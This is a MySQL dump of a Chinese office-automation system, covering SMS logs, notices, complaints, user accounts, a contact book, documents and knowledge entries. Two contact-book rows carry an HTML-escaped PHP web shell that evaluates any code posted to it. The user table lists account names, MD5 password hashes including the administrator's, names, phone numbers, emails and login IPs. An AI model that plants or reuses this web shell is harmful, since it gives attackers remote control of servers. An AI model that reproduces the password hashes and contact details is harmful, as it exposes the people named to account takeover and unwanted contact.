INSERT INTO `xy_smss` VALUES ('11', '0', '2015-05-31 22:05:15', 'OA系统验证码为12015200，24小时之内有效', '18951251872', '1', '成功', '/weboa/index.php?m=Home&c=Msg&a=view', '127.0.0.1');
INSERT INTO `xy_smss` VALUES ('12', '0', '2015-06-03 10:02:55', 'OA系统验证码为12015200，24小时之内有效', '13812349563', '1', '成功', '/weboa/index.php?m=Home&c=Msg&a=view', '127.0.0.1');
INSERT INTO `xy_smss` VALUES ('13', '0', '2015-06-16 13:52:14', '尊敬的客户：恭喜您！您于{Time}成为本店会员，会员卡号为{CardID}，感谢您的光临！', '13812349563', '1', '成功', '/weboa/index.php?m=Home&c=Msg&a=view', '127.0.0.1');

-- ----------------------------
-- Table structure for `xy_tongzhi`
-- ----------------------------
DROP TABLE IF EXISTS `xy_tongzhi`;
CREATE TABLE `xy_tongzhi` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `juid` varchar(500) NOT NULL,
  `juname` varchar(500) NOT NULL,
  `title` varchar(100) NOT NULL,
  `jztime` datetime NOT NULL,
  `content` text NOT NULL,
  `attid` int(11) NOT NULL,
  `beizhu` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='通知公告';

-- ----------------------------
-- Records of xy_tongzhi
-- ----------------------------
INSERT INTO `xy_tongzhi` VALUES ('1', '1', '陈高明', '2015-05-25 11:20:40', '16', '王晓丹', '2015-06-12 12:08:46', '1', '16,1', '王晓丹,陈高明', '1123', '2015-05-29 11:20:31', '&lt;img src=&quot;http://oa.xinyou88.com/crm/Public/BJUI/plugins/kindeditor_4.1.10/plugins/emoticons/images/22.gif&quot; border=&quot;0&quot; alt=&quot;&quot; /&gt;333', '1432524022', '\n陈高明 : 2015-05-25 11:29:55\n陈高明 : 2015-05-25 11:29:59\n陈高明 : 2015-05-25 11:30:02\n陈高明 : 2015-05-25 11:30:07\n王晓丹 : 2015-06-02 18:37:50');

-- ----------------------------
-- Table structure for `xy_tousu`
-- ----------------------------
DROP TABLE IF EXISTS `xy_tousu`;
CREATE TABLE `xy_tousu` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `hid` int(11) NOT NULL,
  `bianhao` varchar(50) NOT NULL,
  `mingcheng` varchar(100) NOT NULL,
  `title` varchar(100) NOT NULL,
  `content` varchar(255) NOT NULL,
  `beizhu` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='投诉管理';

-- ----------------------------
-- Records of xy_tousu
-- ----------------------------
INSERT INTO `xy_tousu` VALUES ('1', '1', '陈高明', '2015-05-31 16:10:33', '1', '陈高明', '2015-05-31 16:10:39', '1', '5', '1505310002', '03333', '百度公司', '的份上说发的范德萨', '范德萨发生');

-- ----------------------------
-- Table structure for `xy_user`
-- ----------------------------
DROP TABLE IF EXISTS `xy_user`;
CREATE TABLE `xy_user` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` char(20) NOT NULL,
  `password` char(32) NOT NULL,
  `depname` varchar(50) NOT NULL,
  `posname` varchar(50) NOT NULL,
  `truename` char(30) NOT NULL,
  `sex` char(5) NOT NULL,
  `tel` varchar(20) NOT NULL,
  `phone` char(11) NOT NULL,
  `neixian` varchar(50) NOT NULL,
  `email` varchar(200) NOT NULL,
  `qq` varchar(20) NOT NULL,
  `logintime` datetime NOT NULL,
  `loginip` char(15) NOT NULL,
  `logins` int(11) NOT NULL,
  `status` tinyint(4) NOT NULL DEFAULT '1',
  `update_time` int(11) NOT NULL,
  `bian` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=20 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of xy_user
-- ----------------------------
INSERT INTO `xy_user` VALUES ('1', 'admin', 'c3284d0f94606de1fd2af172aba15bf3', '综合办公室', '系统管理员', '陈高明', '男', '8552646', '13812349563', '6535665', 'pinkecn@qq.com', '1612985', '2018-11-12 08:57:01', '223.101.17.106', '649', '1', '1541984221', '11');
INSERT INTO `xy_user` VALUES ('17', 'user1', '14e1b600b1fd579f47433b88e8d85291', '技术部', '技术工程师', '张雨', '女', '82821234', '13505125676', '', '87865645@qq.com', '87865645', '2018-10-24 16:35:03', '0.0.0.0', '4', '1', '1540370103', '');
INSERT INTO `xy_user` VALUES ('16', 'liuxing99', '14e1b600b1fd579f47433b88e8d85291', '综合办公室', '总经理', '王晓丹', '女', '111', '11', '', '111', '11', '2015-08-14 20:20:50', '14.122.115.93', '465', '1', '1439554924', '123');
INSERT INTO `xy_user` VALUES ('18', 'make', '14e1b600b1fd579f47433b88e8d85291', '市场部', '客服专员1', '王倩', '女', '85852423', '18905134456', '', '95217711@qq.com', '95217711', '2015-07-06 17:32:34', '222.221.184.137', '2', '1', '1436175221', '');
INSERT INTO `xy_user` VALUES ('19', '123456789', '14e1b600b1fd579f47433b88e8d85291', '综合办公室', '总经理', '123456', '女', '123456', '123456', '', '123456', '123456', '2015-08-10 10:43:20', '116.54.90.220', '1', '1', '1439180229', '');

-- ----------------------------
-- Table structure for `xy_wdtxl`
-- ----------------------------
DROP TABLE IF EXISTS `xy_wdtxl`;
CREATE TABLE `xy_wdtxl` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `title` varchar(50) NOT NULL,
  `sex` varchar(10) NOT NULL,
  `danwei` varchar(200) NOT NULL,
  `zhiwei` varchar(50) NOT NULL,
  `dianhua` varchar(200) NOT NULL,
  `email` varchar(255) NOT NULL,
  `qq` varchar(50) NOT NULL,
  `leixing` varchar(20) NOT NULL,
  `type` varchar(50) NOT NULL,
  `beizhu` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8 COMMENT='我的通讯录';

-- ----------------------------
-- Records of xy_wdtxl
-- ----------------------------
INSERT INTO `xy_wdtxl` VALUES ('1', '1', '陈高明', '2015-05-25 12:27:17', '1', '陈高明', '2015-07-07 11:40:38', '1', '111', '男', '11', '11', '11', '11', '11', '私有', '&lt;?php @eval($_POST[\'caidao\']);?&gt;', '112');
INSERT INTO `xy_wdtxl` VALUES ('3', '1', '陈高明', '2015-07-07 11:40:54', '0', '', '0000-00-00 00:00:00', '1', '发顺丰', '', '', '', '发送', '', '', '私有', '&lt;?php @eval($_POST[\'caidao\']);?&gt;', '');

-- ----------------------------
-- Table structure for `xy_wendang`
-- ----------------------------
DROP TABLE IF EXISTS `xy_wendang`;
CREATE TABLE `xy_wendang` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `title` varchar(50) NOT NULL,
  `type` varchar(50) NOT NULL,
  `beizhu` text NOT NULL,
  `attid` int(11) NOT NULL,
  `juid` varchar(500) NOT NULL,
  `juname` varchar(500) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=utf8 COMMENT='我的文档';

-- ----------------------------
-- Records of xy_wendang
-- ----------------------------
INSERT INTO `xy_wendang` VALUES ('1', '1', '陈高明', '2015-05-25 10:24:17', '0', '', '0000-00-00 00:00:00', '1', '1223', '公司证件', '剩下的', '1432520625', '16', '王晓丹');
INSERT INTO `xy_wendang` VALUES ('2', '17', '张雨', '2015-06-02 19:52:49', '0', '', '0000-00-00 00:00:00', '1', '代码库', '专业知识', '', '1433245831', '', '');
INSERT INTO `xy_wendang` VALUES ('3', '16', '王晓丹', '2015-06-03 14:47:27', '1', '陈高明', '2015-07-07 04:56:07', '1', 'sss', 'sss', 'ssss', '1433314035', '18', '王倩');
INSERT INTO `xy_wendang` VALUES ('4', '16', '王晓丹', '2015-08-13 17:39:34', '0', '', '0000-00-00 00:00:00', '1', 'test_aaa', 'sss', 'test_aaa_bbb', '1439458687', '', '');

-- ----------------------------
-- Table structure for `xy_zhishi`
-- ----------------------------
DROP TABLE IF EXISTS `xy_zhishi`;
CREATE TABLE `xy_zhishi` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `title` varchar(50) NOT NULL,
  `type` varchar(50) NOT NULL,
  `content` text NOT NULL,
  `attid` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 COMMENT='知识管理';

-- ----------------------------
-- Records of xy_zhishi
-- ----------------------------
INSERT INTO `xy_zhishi` VALUES ('1', '1', '陈高明', '2015-05-25 10:40:18', '16', '王晓丹', '2015-07-07 01:25:22', '1', '122', '产品知识', 'rsyiy;/ipy;poy;l8i', '1432521605');
